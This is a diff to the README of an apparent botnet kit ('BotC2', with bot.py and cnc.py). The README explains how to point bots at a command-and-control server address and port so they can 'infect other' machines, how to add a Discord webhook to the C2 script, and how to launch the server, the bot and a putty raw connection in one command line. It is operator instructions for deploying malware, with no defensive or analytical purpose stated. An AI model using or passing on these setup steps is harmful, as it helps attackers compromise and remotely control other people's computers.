@@ -20,7 +20,7 @@ EXAMPLE CHANGE
 
 bot.py (file)
 +-------------------------------+
-C2_ADDRESS  = "1.1.1.1"
+C2_ADDRESS  = "1.1.1.1" <--- change c2 sevrer (if not localhost)
 C2_PORT     = 8185
 +--------------------------------+
 
@@ -28,11 +28,7 @@ c2.py (command)
 screen python3 cnc.py 8185
 python3 cnc.py 8185
 
-# setp next #
-if move ip c2 from 127.0.0.1 to other pls replace this C2_ADDRESS  = "127.0.0.1" with you IP C2 in files bot.py for infect other
-if you wanna run in server (vpn) or computer/notebook | pls not replace
-
-EXAMPLE CONNECT
+EXAMPLE CONNECT IF YOU CHANGE IP IN bot.py
 
   1.1.1.1 = c2 server ip
 127.0.0.1 = localhost ip
@@ -41,7 +37,8 @@ EXAMPLE CONNECT
 127.0.0.1 ---> 1.1.1.1 |    bot = show    | in ip localhost computer/notebook/vpn
 192.0.0.1 ---> 1.1.1.1 |    bot = show    | not ip localhost computer/notebook/vpn
   1.1.1.1 ---> 1.1.1.1 | bot = can't show | because can't connect
-  
+
+# setp next #
 vscode/notepad | and next you open in cnc.py and saw this OTP_WEB = "" replace this with OTP_WEB = "link_webhook_discord"
 install | and install program putty https://putty.org/ | if you don't have python program  https://www.python.org/ 
 cmd | cd (path folder BotC2) & start python cnc.py 8080 & start python bot.py & start putty.exe -raw 127.0.0.1 8080
